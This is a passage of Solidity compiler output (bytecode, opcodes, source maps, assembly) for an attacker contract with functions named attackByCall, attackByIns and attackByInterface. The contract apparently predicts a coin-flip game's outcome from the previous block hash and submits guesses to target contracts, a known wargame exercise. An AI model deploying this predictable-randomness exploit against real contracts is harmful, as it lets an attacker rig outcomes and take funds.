SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH2 0x372 PUSH1 0x1 NUMBER PUSH2 0x3B0 SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST BLOCKHASH PUSH1 0x0 SHR SWAP1 POP PUSH1 0x0 PUSH2 0x38F PUSH1 0x3 SLOAD DUP4 PUSH2 0x3FA SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH1 0x1 DUP3 EQ PUSH2 0x3A2 JUMPI PUSH1 0x0 PUSH2 0x3A5 JUMP JUMPDEST PUSH1 0x1 JUMPDEST SWAP1 POP DUP1 SWAP4 POP POP POP POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x3F2 DUP4 DUP4 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1E DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x536166654D6174683A207375627472616374696F6E206F766572666C6F770000 DUP2 MSTORE POP PUSH2 0x444 JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x43C DUP4 DUP4 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1A DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x536166654D6174683A206469766973696F6E206279207A65726F000000000000 DUP2 MSTORE POP PUSH2 0x504 JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP4 DUP4 GT ISZERO DUP3 SWAP1 PUSH2 0x4F1 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x4B6 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x49B JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x4E3 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP PUSH1 0x0 DUP4 DUP6 SUB SWAP1 POP DUP1 SWAP2 POP POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 DUP4 GT DUP3 SWAP1 PUSH2 0x5B0 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x575 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x55A JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x5A2 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP PUSH1 0x0 DUP4 DUP6 DUP2 PUSH2 0x5BC JUMPI INVALID JUMPDEST DIV SWAP1 POP DUP1 SWAP2 POP POP SWAP4 SWAP3 POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SELFBALANCE 0x24 BLOCKHASH INVALID 0xB7 0xC9 ISZERO 0xC1 DUP3 SWAP12 LOG2 0x29 0xC DUP8 ORIGIN 0xC5 0x5C JUMPI 0xDC BALANCE 0xAF MOD ORIGIN KECCAK256 0xE0 INVALID 0xDF TIMESTAMP MSIZE LT 0x26 0xCA PUSH5 0x736F6C6343 STOP MOD 0xC STOP CALLER ",
							"sourceMap": "1159:1339:0:-:0;;;1335:77;1318:94;;1421:150;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1473:5;1466:4;;:12;;;;;;;;;;;;;;;;;;1507:5;1489:6;;:24;;;;;;;;;;;;;;;;;;1557:5;1524:12;;:39;;;;;;;;;;;;;;;;;;1421:150;1159:1339;;;;;;"
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b50600436106100415760003560e01c80631a13ff681461004657806383e0052514610050578063b6f02db91461005a575b600080fd5b61004e610064565b005b6100586101d7565b005b610062610299565b005b600061006e61035b565b905060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16816040516024018082151581526020019150506040516020818303038152906040527f1d263f67000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040518082805190602001908083835b6020831061016a5780518252602082019150602081019050602083039250610147565b6001836020036101000a0380198251168184511680821785525050505050509050019150506000604051808303816000865af19150503d80600081146101cc576040519150601f19603f3d011682016040523d82523d6000602084013e6101d1565b606091505b50505050565b60006101e161035b565b9050600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631d263f67826040518263ffffffff1660e01b8152600401808215158152602001915050602060405180830381600087803b15801561025a57600080fd5b505af115801561026e573d6000803e3d6000fd5b505050506040513d602081101561028457600080fd5b81019080805190602001909291905050505050565b60006102a361035b565b9050600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631d263f67826040518263ffffffff1660e01b8152600401808215158152602001915050602060405180830381600087803b15801561031c57600080fd5b505af1158015610330573d6000803e3d6000fd5b505050506040513d602081101561034657600080fd5b81019080805190602001909291905050505050565b6000806103726001436103b090919063ffffffff16565b4060001c9050600061038f600354836103fa90919063ffffffff16565b90506000600182146103a25760006103a5565b60015b905080935050505090565b60006103f283836040518060400160405280601e81526020017f536166654d6174683a207375627472616374696f6e206f766572666c6f770000815250610444565b905092915050565b600061043c83836040518060400160405280601a81526020017f536166654d6174683a206469766973696f6e206279207a65726f000000000000815250610504565b905092915050565b60008383111582906104f1576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825283818151815260200191508051906020019080838360005b838110156104b657808201518184015260208101905061049b565b50505050905090810190601f1680156104e35780820380516001836020036101000a031916815260200191505b509250505060405180910390fd5b5060008385039050809150509392505050565b600080831182906105b0576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825283818151815260200191508051906020019080838360005b8381101561057557808201518184015260208101905061055a565b50505050905090810190601f1680156105a25780820380516001836020036101000a031916815260200191505b509250505060405180910390fd5b5060008385816105bc57fe5b04905080915050939250505056fea2646970667358221220472440feb7c915c1829ba2290c8732c55c57dc31af063220e0fedf42591026ca64736f6c634300060c0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x41 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x1A13FF68 EQ PUSH2 0x46 JUMPI DUP1 PUSH4 0x83E00525 EQ PUSH2 0x50 JUMPI DUP1 PUSH4 0xB6F02DB9 EQ PUSH2 0x5A JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x4E PUSH2 0x64 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x58 PUSH2 0x1D7 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x62 PUSH2 0x299 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 PUSH2 0x6E PUSH2 0x35B JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 PUSH1 0x40 MLOAD PUSH1 0x24 ADD DUP1 DUP3 ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH32 0x1D263F6700000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP4 DUP2 DUP4 AND OR DUP4 MSTORE POP POP POP POP PUSH1 0x40 MLOAD DUP1 DUP3 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x16A JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x147 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP7 GAS CALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x1CC JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x1D1 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1E1 PUSH2 0x35B JUMP JUMPDEST SWAP1 POP PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x1D263F67 DUP3 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x25A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x26E JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x284 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x2A3 PUSH2 0x35B JUMP JUMPDEST SWAP1 POP PUSH1 0x2 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x1D263F67 DUP3 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x31C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x330 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x346 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH2 0x372 PUSH1 0x1 NUMBER PUSH2 0x3B0 SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST BLOCKHASH PUSH1 0x0 SHR SWAP1 POP PUSH1 0x0 PUSH2 0x38F PUSH1 0x3 SLOAD DUP4 PUSH2 0x3FA SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH1 0x1 DUP3 EQ PUSH2 0x3A2 JUMPI PUSH1 0x0 PUSH2 0x3A5 JUMP JUMPDEST PUSH1 0x1 JUMPDEST SWAP1 POP DUP1 SWAP4 POP POP POP POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x3F2 DUP4 DUP4 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1E DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x536166654D6174683A207375627472616374696F6E206F766572666C6F770000 DUP2 MSTORE POP PUSH2 0x444 JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x43C DUP4 DUP4 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1A DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x536166654D6174683A206469766973696F6E206279207A65726F000000000000 DUP2 MSTORE POP PUSH2 0x504 JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP4 DUP4 GT ISZERO DUP3 SWAP1 PUSH2 0x4F1 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x4B6 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x49B JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x4E3 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP PUSH1 0x0 DUP4 DUP6 SUB SWAP1 POP DUP1 SWAP2 POP POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 DUP4 GT DUP3 SWAP1 PUSH2 0x5B0 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x575 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x55A JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x5A2 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP PUSH1 0x0 DUP4 DUP6 DUP2 PUSH2 0x5BC JUMPI INVALID JUMPDEST DIV SWAP1 POP DUP1 SWAP2 POP POP SWAP4 SWAP3 POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SELFBALANCE 0x24 BLOCKHASH INVALID 0xB7 0xC9 ISZERO 0xC1 DUP3 SWAP12 LOG2 0x29 0xC DUP8 ORIGIN 0xC5 0x5C JUMPI 0xDC BALANCE 0xAF MOD ORIGIN KECCAK256 0xE0 INVALID 0xDF TIMESTAMP MSIZE LT 0x26 0xCA PUSH5 0x736F6C6343 STOP MOD 0xC STOP CALLER ",
							"sourceMap": "1159:1339:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;2358:135;;;:::i;:::-;;2019:98;;;:::i;:::-;;2203:110;;;:::i;:::-;;2358:135;2400:9;2412;:7;:9::i;:::-;2400:21;;2432:4;;;;;;;;;;:9;;2479:4;2442:42;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;2432:53;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;2358:135;:::o;2019:98::-;2060:9;2072;:7;:9::i;:::-;2060:21;;2092:6;;;;;;;;;;;:11;;;2104:4;2092:17;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;2019:98;:::o;2203:110::-;2250:9;2262;:7;:9::i;:::-;2250:21;;2282:12;;;;;;;;;;;:17;;;2300:4;2282:23;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;2203:110;:::o;1696:246::-;1732:4;1749:18;1788:19;1805:1;1788:12;:16;;:19;;;;:::i;:::-;1778:30;1770:39;;1749:60;;1820:16;1839:22;1854:6;;1839:10;:14;;:22;;;;:::i;:::-;1820:41;;1872:9;1896:1;1884:8;:13;:28;;1907:5;1884:28;;;1900:4;1884:28;1872:40;;1930:4;1923:11;;;;;1696:246;:::o;1274:134:1:-;1332:7;1358:43;1362:1;1365;1358:43;;;;;;;;;;;;;;;;;:3;:43::i;:::-;1351:50;;1274:134;;;;:::o;3033:130::-;3091:7;3117:39;3121:1;3124;3117:39;;;;;;;;;;;;;;;;;:3;:39::i;:::-;3110:46;;3033:130;;;;:::o;1692:187::-;1778:7;1810:1;1805;:6;;1813:12;1797:29;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1836:9;1852:1;1848;:5;1836:17;;1871:1;1864:8;;;1692:187;;;;;:::o;3638:338::-;3724:7;3821:1;3817;:5;3824:12;3809:28;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;3847:9;3863:1;3859;:5;;;;;;3847:17;;3968:1;3961:8;;;3638:338;;;;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "307200",
								"executionCost": "infinite",
								"totalCost": "infinite"
							},
							"external": {
								"attackByCall()": "infinite",
								"attackByIns()": "infinite",
								"attackByInterface()": "infinite"
							},
							"internal": {
								"getFlip()": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 1159,
									"end": 2498,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 1159,
									"end": 2498,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 1159,
									"end": 2498,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 1335,
									"end": 1412,
									"name": "PUSH",
									"source": 0,
									"value": "8000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 1318,
									"end": 1412,
									"name": "PUSH",
									"source": 0,
									"value": "3"
								},
								{
									"begin": 1318,
									"end": 1412,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 1421,
									"end": 1571,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 1421,
									"end": 1571,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 1421,
									"end": 1571,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 1421,
									"end": 1571,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 1421,
									"end": 1571,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 1421,
									"end": 1571,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 1421,
									"end": 1571,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 1421,
									"end": 1571,
									"name": "REVERT",
									"source": 0
								},
								{
									"begin": 1421,
									"end": 1571,
									"name": "tag",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 1421,
									"end": 1571,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 1421,
									"end": 1571,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 1421,
									"end": 1571,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 1421,
									"end": 1571,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 1421,
									"end": 1571,
									"name": "PUSHSIZE",
									"source": 0
								},
								{
									"begin": 1421,
									"end": 1571,
									"name": "CODESIZE",
									"source": 0
								},
								{
									"begin": 1421,
									"end": 1571,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 1421,
									"end": 1571,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 1421,
									"end": 1571,
									"name": "PUSHSIZE",
									"source": 0
								},
								{
									"begin": 1421,
									"end": 1571,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 1421,
									"end": 1571,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 1421,
									"end": 1571,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 1421,
									"end": 1571,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 1421,
									"end": 1571,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 1421,
									"end": 1571,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 1421,
									"end": 1571,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 1421,
									"end": 1571,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 1421,
									"end": 1571,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 1421,
									"end": 1571,
									"name": "LT",
									"source": 0
								},
								{
									"begin": 1421,
									"end": 1571,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 1421,
									"end": 1571,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "2"
								},
								{
									"begin": 1421,
									"end": 1571,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 1421,
									"end": 1571,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 1421,
									"end": 1571,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 1421,
									"end": 1571,
									"name": "REVERT",
									"source": 0
								},
								{
									"begin": 1421,
									"end": 1571,
									"name": "tag",
									"source": 0,
									"value": "2"
								},
								{
									"begin": 1421,
									"end": 1571,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 1421,
									"end": 1571,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 1421,
									"end": 1571,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 1421,
									"end": 1571,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 1421,
									"end": 1571,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 1421,
									"end": 1571,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 1421,
									"end": 1571,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 1421,
									"end": 1571,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 1421,
									"end": 1571,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 1421,
									"end": 1571,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 1421,
									"end": 1571,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 1421,
									"end": 1571,
									"name": "SWAP3",
									"source": 0
								},
								{
									"begin": 1421,
									"end": 1571,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 1421,
									"end": 1571,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 1421,
									"end": 1571,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 1421,
									"end": 1571,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 1421,
									"end": 1571,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 1473,
									"end": 1478,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 1466,
									"end": 1470,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 1466,
									"end": 1470,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 1466,
									"end": 1478,
									"name": "PUSH",
									"source": 0,
									"value": "100"
								},
								{
									"begin": 1466,
									"end": 1478,
									"name": "EXP",
									"source": 0
								},
								{
									"begin": 1466,
									"end": 1478,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 1466,
									"end": 1478,
									"name": "SLOAD",
									"source": 0
								},
								{
									"begin": 1466,
									"end": 1478,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 1466,
									"end": 1478,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 1466,
									"end": 1478,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 1466,
									"end": 1478,
									"name": "NOT",
									"source": 0
								},
								{
									"begin": 1466,
									"end": 1478,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 1466,
									"end": 1478,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 1466,
									"end": 1478,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 1466,
									"end": 1478,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 1466,
									"end": 1478,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 1466,
									"end": 1478,
